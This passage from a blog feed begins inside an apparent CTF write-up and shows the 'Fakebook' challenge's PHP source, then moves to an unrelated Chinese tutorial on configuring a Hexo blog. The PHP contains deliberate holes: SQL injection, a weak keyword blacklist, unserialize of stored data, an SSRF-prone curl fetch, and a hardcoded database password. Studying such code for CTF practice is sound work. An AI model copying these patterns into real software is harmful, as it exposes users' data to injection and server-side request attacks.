class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">    &lt;h1&gt;the Fakebook&lt;&#x2F;h1&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line"></span><br><span class="line">    if (!isset($_SESSION[&#39;username&#39;])) &#123;</span><br><span class="line">        $message &#x3D; &quot;&lt;div class&#x3D;&#39;row&#39;&gt;&quot;;</span><br><span class="line">        $message .&#x3D; &quot;&lt;div class&#x3D;&#39;col-md-2&#39;&gt;&lt;a href&#x3D;&#39;login.php&#39; class&#x3D;&#39;btn btn-success&#39;&gt;login&lt;&#x2F;a&gt;&lt;&#x2F;div&gt;&quot;;</span><br><span class="line">        $message .&#x3D; &quot;&lt;div class&#x3D;&#39;col-md-2&#39;&gt;&lt;a href&#x3D;&#39;join.php&#39; class&#x3D;&#39;btn btn-info&#39;&gt;join&lt;&#x2F;a&gt;&lt;&#x2F;div&gt;&quot;;</span><br><span class="line">        $message .&#x3D; &quot;&lt;&#x2F;div&gt;&quot;;</span><br><span class="line"></span><br><span class="line">        echo $message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ?&gt;</span><br><span class="line">    &lt;p&gt;Share your stories with friends, family and friends from all over the world on &lt;code&gt;Fakebook&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">    &lt;table class&#x3D;&quot;table&quot;&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;th&gt;#&lt;&#x2F;th&gt;</span><br><span class="line">            &lt;th&gt;username&lt;&#x2F;th&gt;</span><br><span class="line">            &lt;th&gt;age&lt;&#x2F;th&gt;</span><br><span class="line">            &lt;th&gt;blog&lt;&#x2F;th&gt;</span><br><span class="line">        &lt;&#x2F;tr&gt;</span><br><span class="line">        &lt;?php</span><br><span class="line"></span><br><span class="line">        foreach ($db-&gt;getAllUsers() as $user)</span><br><span class="line">        &#123;</span><br><span class="line">            $data &#x3D; unserialize($user[&#39;data&#39;]);</span><br><span class="line"></span><br><span class="line">            echo &quot;&lt;tr&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;td&gt;&#123;$user[&#39;no&#39;]&#125;&lt;&#x2F;td&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;td&gt;&lt;a href&#x3D;&#39;view.php?no&#x3D;&#123;$user[&#39;no&#39;]&#125;&#39;&gt;&#123;$user[&#39;username&#39;]&#125;&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;td&gt;&#123;$data-&gt;age&#125;&lt;&#x2F;td&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;td&gt;&#123;$data-&gt;blog&#125;&lt;&#x2F;td&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;&#x2F;tr&gt;\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ?&gt;</span><br><span class="line">    &lt;&#x2F;table&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="db-php"><a href="#db-php" class="headerlink" title="db.php"></a>db.php</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">require_once &#39;lib.php&#39;;</span><br><span class="line">$mysqli &#x3D; new mysqli(&#39;127.0.0.1&#39;, &#39;root&#39;, &#39;naiwjebfahjebfja&#39;, &#39;fakebook&#39;);</span><br><span class="line"></span><br><span class="line">class DB &#123;</span><br><span class="line"></span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        &#x2F;&#x2F; $mysqli &#x3D; new mysqli(&#39;localhost&#39;, &#39;root&#39;, &#39;!@#1234!@#&#39;, &#39;fakebook&#39;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isValidUsername($username) &#123;</span><br><span class="line">        global $mysqli;</span><br><span class="line">        $query &#x3D; &quot;select * from users where username &#x3D; &#39;&#123;$username&#125;&#39;&quot;;</span><br><span class="line">        $res &#x3D; $mysqli-&gt;query($query);</span><br><span class="line">        if (!$res-&gt;fetch_array()) &#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function login($username, $passwd) &#123;</span><br><span class="line">        global $mysqli;</span><br><span class="line"></span><br><span class="line">        $username &#x3D; addslashes($username);</span><br><span class="line">        $passwd &#x3D; sha512($passwd);</span><br><span class="line">        $query &#x3D; &quot;select * from users where username &#x3D; &#39;&#123;$username&#125;&#39; and passwd &#x3D; &#39;&#123;$passwd&#125;&#39;&quot;;</span><br><span class="line">        $res &#x3D; $mysqli-&gt;query($query);</span><br><span class="line"></span><br><span class="line">        return $res-&gt;fetch_array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function insertUser($username, $passwd, $data) &#123;</span><br><span class="line">        global $mysqli;</span><br><span class="line"></span><br><span class="line">        $username &#x3D; substr($username, 0, 100);</span><br><span class="line">        $username &#x3D; addslashes($username);</span><br><span class="line">        $passwd &#x3D; sha512($passwd);</span><br><span class="line">        $data &#x3D; serialize($data);</span><br><span class="line">        $data &#x3D; addslashes($data);</span><br><span class="line"></span><br><span class="line">        $query &#x3D; &quot;insert into users (username, passwd, data) values (&#39;&#123;$username&#125;&#39;, &#39;&#123;$passwd&#125;&#39;, &#39;&#123;$data&#125;&#39;)&quot;;</span><br><span class="line">        return $mysqli-&gt;real_query($query);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getAllUsers() &#123;</span><br><span class="line">        global $mysqli;</span><br><span class="line"></span><br><span class="line">        $query &#x3D; &quot;select * from users&quot;;</span><br><span class="line">        $res &#x3D; $mysqli-&gt;query($query);</span><br><span class="line">        return $res-&gt;fetch_all(MYSQLI_ASSOC);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getUserByNo($no) &#123;</span><br><span class="line">        global $mysqli;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; $no &#x3D; addslashes($no);</span><br><span class="line">        $query &#x3D; &quot;select * from users where no &#x3D; &#123;$no&#125;&quot;;</span><br><span class="line">        $res &#x3D; $mysqli-&gt;query($query);</span><br><span class="line">        if (!$res) &#123;</span><br><span class="line">            echo &quot;&lt;p&gt;[*] query error! (&#123;$mysqli-&gt;error&#125;)&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return $res-&gt;fetch_assoc();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function anti_sqli($no) &#123;</span><br><span class="line">        $patterns &#x3D; &quot;&#x2F;union\Wselect|0x|hex&#x2F;i&quot;;</span><br><span class="line"></span><br><span class="line">        return preg_match($patterns, $no);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line">CREATE TABLE &#96;users&#96; ( &#96;no&#96; INT NOT NULL AUTO_INCREMENT , &#96;username&#96; VARCHAR(100) NOT NULL , &#96;passwd&#96; VARCHAR(128) NOT NULL , &#96;data&#96; TEXT NOT NULL , PRIMARY KEY (&#96;no&#96;)) ENGINE &#x3D; MyISAM;</span><br><span class="line"></span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="user-php"><a href="#user-php" class="headerlink" title="user.php"></a>user.php</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name &#x3D; &quot;&quot;;</span><br><span class="line">    public $age &#x3D; 0;</span><br><span class="line">    public $blog &#x3D; &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name &#x3D; $name;</span><br><span class="line">        $this-&gt;age &#x3D; (int)$age;</span><br><span class="line">        $this-&gt;blog &#x3D; $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get($url)</span><br><span class="line">    &#123;</span><br><span class="line">        $ch &#x3D; curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">        $output &#x3D; curl_exec($ch);</span><br><span class="line">        $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        if($httpCode &#x3D;&#x3D; 404) &#123;</span><br><span class="line">            return 404;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        return $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getBlogContents ()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($this-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isValidBlog ()</span><br><span class="line">    &#123;</span><br><span class="line">        $blog &#x3D; $this-&gt;blog;</span><br><span class="line">        return preg_match(&quot;&#x2F;^(((http(s?))\:\&#x2F;\&#x2F;)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\&#x2F;\S*)?$&#x2F;i&quot;, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="lib-php"><a href="#lib-php" class="headerlink" title="lib.php"></a>lib.php</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function sha512($data)</span><br><span class="line">&#123;</span><br><span class="line">    return hash(&#39;sha512&#39;, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function xss($data)</span><br><span class="line">&#123;</span><br><span class="line">    return htmlspecialchars($data, ENT_QUOTES, &#39;UTF-8&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function anti_object_injection($unserializedData)</span><br><span class="line">&#123;</span><br><span class="line">    if (preg_match(&quot;&#x2F;O:&#x2F;i&quot;, $unserializedData))</span><br><span class="line">    &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    else</span><br><span class="line">        return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="bootstrap-php"><a href="#bootstrap-php" class="headerlink" title="bootstrap.php"></a>bootstrap.php</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;css&#x2F;bootstrap.min.css&quot; crossorigin&#x3D;&quot;anonymous&quot;&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;js&#x2F;jquery-3.3.1.slim.min.js&quot; crossorigin&#x3D;&quot;anonymous&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;js&#x2F;popper.min.js&quot; crossorigin&#x3D;&quot;anonymous&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;js&#x2F;bootstrap.min.js&quot; crossorigin&#x3D;&quot;anonymous&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="view-php"><a href="#view-php" class="headerlink" title="view.php"></a>view.php</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php session_start(); ?&gt;</span><br><span class="line">&lt;?php require_once &#39;db.php&#39;; ?&gt;</span><br><span class="line">&lt;?php require_once &#39;user.php&#39;; ?&gt;</span><br><span class="line">&lt;?php require_once &#39;error.php&#39;; ?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$db &#x3D; new DB();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;ko&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot;</span><br><span class="line">          content&#x3D;&quot;width&#x3D;device-width, user-scalable&#x3D;no, initial-scale&#x3D;1.0, maximum-scale&#x3D;1.0, minimum-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;ie&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;User&lt;&#x2F;title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php require_once &#39;bootstrap.php&#39;; ?&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$no &#x3D; $_GET[&#39;no&#39;];</span><br><span class="line">if ($db-&gt;anti_sqli($no))</span><br><span class="line">&#123;</span><br><span class="line">    die(&quot;no hack ~_~&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$res &#x3D; $db-&gt;getUserByNo($no);</span><br><span class="line">$user &#x3D; unserialize($res[&#39;data&#39;]);</span><br><span class="line">&#x2F;&#x2F;print_r($res);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">    &lt;table class&#x3D;&quot;table&quot;&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;th&gt;</span><br><span class="line">                username</span><br><span class="line">            &lt;&#x2F;th&gt;</span><br><span class="line">            &lt;th&gt;</span><br><span class="line">                age</span><br><span class="line">            &lt;&#x2F;th&gt;</span><br><span class="line">            &lt;th&gt;</span><br><span class="line">                blog</span><br><span class="line">            &lt;&#x2F;th&gt;</span><br><span class="line">        &lt;&#x2F;tr&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;</span><br><span class="line">                &lt;?php echo $res[&#39;username&#39;]; ?&gt;</span><br><span class="line">            &lt;&#x2F;td&gt;</span><br><span class="line">            &lt;td&gt;</span><br><span class="line">                &lt;?php echo $user-&gt;age; ?&gt;</span><br><span class="line">            &lt;&#x2F;td&gt;</span><br><span class="line">            &lt;td&gt;</span><br><span class="line">                &lt;?php echo xss($user-&gt;blog); ?&gt;</span><br><span class="line">            &lt;&#x2F;td&gt;</span><br><span class="line">        &lt;&#x2F;tr&gt;</span><br><span class="line">    &lt;&#x2F;table&gt;</span><br><span class="line"></span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">    &lt;p&gt;the contents of his&#x2F;her blog&lt;&#x2F;p&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line"></span><br><span class="line">    $response &#x3D; $user-&gt;getBlogContents();</span><br><span class="line">    if ($response &#x3D;&#x3D;&#x3D; 404)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;404 Not found&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        $base64 &#x3D; base64_encode($response);</span><br><span class="line">        echo &quot;&lt;iframe width&#x3D;&#39;100%&#39; height&#x3D;&#39;10em&#39; src&#x3D;&#39;data:text&#x2F;html;base64,&#123;$base64&#125;&#39;&gt;&quot;;</span><br><span class="line">        &#x2F;&#x2F; echo $response;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; var_dump($user-&gt;getBlogContents());</span><br><span class="line">    ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<h4 id="error-php"><a href="#error-php" class="headerlink" title="error.php"></a>error.php</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line">ini_set(&quot;display_errors&quot;, 1);</span><br><span class="line">&#x2F;&#x2F; error_reporting(0);</span><br><span class="line">&#x2F;&#x2F; ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$flag &#x3D; &quot;flag&#123;c1e552fdf77049fabf65168f22f7aeab&#125;&quot;;</span><br><span class="line">exit(0);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="join-php"><a href="#join-php" class="headerlink" title="join.php"></a>join.php</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;ko&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot;</span><br><span class="line">          content&#x3D;&quot;width&#x3D;device-width, user-scalable&#x3D;no, initial-scale&#x3D;1.0, maximum-scale&#x3D;1.0, minimum-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;ie&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;Join&lt;&#x2F;title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php include &#39;bootstrap.php&#39;; ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">    &lt;h1&gt;Join&lt;&#x2F;h1&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;form-group&quot;&gt;</span><br><span class="line">        &lt;form action&#x3D;&quot;join.ok.php&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">            &lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class="line">                &lt;div class&#x3D;&quot;col-md-1&quot;&gt;</span><br><span class="line">                    username</span><br><span class="line">                &lt;&#x2F;div&gt;</span><br><span class="line">                &lt;div class&#x3D;&quot;col-md-4&quot;&gt;</span><br><span class="line">                    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; maxlength&#x3D;&quot;100&quot; class&#x3D;&quot;form-control&quot;&gt;</span><br><span class="line">                &lt;&#x2F;div&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">            &lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class="line">                &lt;div class&#x3D;&quot;col-md-1&quot;&gt;</span><br><span class="line">                    passwd :</span><br><span class="line">                &lt;&#x2F;div&gt;</span><br><span class="line">                &lt;div class&#x3D;&quot;col-md-4&quot;&gt;</span><br><span class="line">                    &lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;passwd&quot; class&#x3D;&quot;form-control&quot;&gt;</span><br><span class="line">                &lt;&#x2F;div&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">            &lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class="line">                &lt;div class&#x3D;&quot;col-md-1&quot;&gt;</span><br><span class="line">                    age :</span><br><span class="line">                &lt;&#x2F;div&gt;</span><br><span class="line">                &lt;div class&#x3D;&quot;col-md-4&quot;&gt;</span><br><span class="line">                    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;age&quot; class&#x3D;&quot;form-control&quot;&gt;</span><br><span class="line">                &lt;&#x2F;div&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">            &lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class="line">                &lt;div class&#x3D;&quot;col-md-1&quot;&gt;</span><br><span class="line">                    blog :</span><br><span class="line">                &lt;&#x2F;div&gt;</span><br><span class="line">                &lt;div class&#x3D;&quot;col-md-4&quot;&gt;</span><br><span class="line">                    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;blog&quot; class&#x3D;&quot;form-control&quot;&gt;</span><br><span class="line">                &lt;&#x2F;div&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">            &lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class="line">                &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;join&quot; class&#x3D;&quot;btn btn-info&quot;&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &lt;&#x2F;form&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WEB</tag>
        <tag>CTF</tag>
        <tag>SQLi</tag>
        <tag>PHP</tag>
        <tag>攻防世界</tag>
        <tag>反序列</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo建站笔记</title>
    <url>/2019/07/08/hexo-blog/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>因一次意外，hexo博客源码被删除干净，抽空重新配置hexo并重新写了之前的文章，这里把配置hexo各项功能作个记录。</p>
<h3 id="hexo版本"><a href="#hexo版本" class="headerlink" title="hexo版本"></a>hexo版本</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">λ hexo version</span><br><span class="line">hexo-cli: 4.2.0</span><br><span class="line">os: Windows_NT 10.0.18363 win32 x64</span><br><span class="line">node: 12.18.3</span><br><span class="line">v8: 7.8.279.23-node.39</span><br><span class="line">uv: 1.38.0</span><br><span class="line">zlib: 1.2.11</span><br><span class="line">brotli: 1.0.7</span><br><span class="line">ares: 1.16.0</span><br><span class="line">modules: 72</span><br><span class="line">nghttp2: 1.41.0</span><br><span class="line">napi: 6</span><br><span class="line">llhttp: 2.0.4</span><br><span class="line">http_parser: 2.9.3</span><br><span class="line">openssl: 1.1.1g</span><br><span class="line">cldr: 37.0</span><br><span class="line">icu: 67.1</span><br><span class="line">tz: 2019c</span><br><span class="line">unicode: 13.0</span><br></pre></td></tr></table></figure>

<h3 id="安装next主题"><a href="#安装next主题" class="headerlink" title="安装next主题"></a>安装next主题</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> hexo</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/theme-next/hexo-theme-next themes/next</span></span><br></pre></td></tr></table></figure>

<h3 id="创建-“关于我”-页面"><a href="#创建-“关于我”-页面" class="headerlink" title="创建 “关于我” 页面"></a>创建 “关于我” 页面</h3><p>新建一个 about 页面：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo new page &quot;about&quot;</span><br></pre></td></tr></table></figure>
<p>菜单显示 about 链接，在主题的 _configy.yml 设置中将 menu 中 about 前面的注释去掉即可。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">/</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">/tags</span></span><br><span class="line">  <span class="attr">about:</span> <span class="string">/about</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h3 id="创建分类页面"><a href="#创建分类页面" class="headerlink" title="创建分类页面"></a>创建分类页面</h3><p>添加一个 分类 页面，并在菜单中显示页面链接。</p>
<ol>
<li>新建一个页面，命名为 categories 。命令如下：<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo new page categories</span><br></pre></td></tr></table></figure></li>
<li>编辑刚新建的页面，将页面的类型设置为<code>categories</code>，主题将自动为这个页面显示所有分类。<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">title:</span> <span class="string">分类</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2014-12-22 12:39:04</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;categories&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure>
注意：如果有启用<code>多说</code>或者<code>Disqus</code>评论，默认页面也会带有评论。需要关闭的话，请添加字段<code>comments</code>并将值设置为<code>false</code>，如：<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">title:</span> <span class="string">分类</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2014-12-22 12:39:04</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;categories&quot;</span></span><br><span class="line"><span class="attr">comments:</span> <span class="literal">false</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure>
在菜单中添加链接。编辑主题的<code>_config.yml</code>，将<code>menu</code>中的<code>categories: /categories</code>注释去掉，如下:<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">/</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">/categories</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">/tags</span></span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="创建标签云页面"><a href="#创建标签云页面" class="headerlink" title="创建标签云页面"></a>创建标签云页面</h3><p>添加一个标签云页面，并在菜单中显示页面链接。</p>
<ol>
<li>新建一个页面，命名为<code>tags</code>。命令如下：<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo new page &quot;tags&quot;</span><br></pre></td></tr></table></figure></li>
<li>编辑刚新建的页面，将页面的类型设置为<code>tags</code>，主题将自动为这个页面显示标签云。<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">title:</span> <span class="string">All</span> <span class="string">tags</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2014-12-22 12:39:04</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;tags&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure>
注意：如果有启用<code>多说</code>或者<code>Disqus</code>评论，默认页面也会带有评论。需要关闭的话，请添加字段<code>comments</code>并将值设置为<code>false</code>，如：<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">title:</span> <span class="string">All</span> <span class="string">tags</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2014-12-22 12:39:04</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;tags&quot;</span></span><br><span class="line"><span class="attr">comments:</span> <span class="literal">false</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure></li>
<li>在菜单中添加链接。编辑主题的<code>_config.yml</code>，添加<code>tags</code>到<code>menu</code>中，如下:<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">/</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">/tags</span></span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="站内搜索功能"><a href="#站内搜索功能" class="headerlink" title="站内搜索功能"></a>站内搜索功能</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure>
<p>打开主题配置文件_config.yml,搜索local_search,其值改为true：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">local_search:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># If auto, trigger search by changing input.</span></span><br><span class="line">  <span class="comment"># If manual, trigger search by pressing enter key or search button.</span></span><br><span class="line">  <span class="attr">trigger:</span> <span class="string">auto</span></span><br><span class="line">  <span class="comment"># Show top n results per article, show all results by setting to -1</span></span><br><span class="line">  <span class="attr">top_n_per_article:</span> <span class="number">1</span></span><br><span class="line">  <span class="comment"># Unescape html strings to the readable one.</span></span><br><span class="line">  <span class="attr">unescape:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># Preload the search data when the page loads.</span></span><br><span class="line">  <span class="attr">preload:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
<h3 id="添加头像"><a href="#添加头像" class="headerlink" title="添加头像"></a>添加头像</h3><p>把头像图片下载到以下目录：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">blog\themes\next\source\images\avatar.jpg</span><br></pre></td></tr></table></figure>
<p>然后在next主题的——config.yml下面填入url：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">avatar:</span></span><br><span class="line">  <span class="comment"># Replace the default image and set the url here.</span></span><br><span class="line">  <span class="attr">url:</span> <span class="string">/images/avatar.jpg</span></span><br></pre></td></tr></table></figure>

